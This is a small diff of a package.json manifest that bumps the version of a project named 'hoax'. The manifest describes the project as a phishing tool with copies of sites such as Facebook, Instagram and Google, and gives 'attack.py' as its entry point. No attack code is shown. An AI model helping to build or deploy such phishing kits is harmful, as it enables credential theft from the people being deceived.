@@ -1,6 +1,6 @@
 {
   "name": "hoax",
-  "version": "1.0.0",
+  "version": "1.2.0",
   "description": "hoax is phishing tool which contain huge collection of phishing site like Facebook, instagram, google and etc.",
   "main": "attack.py",
   "scripts": {
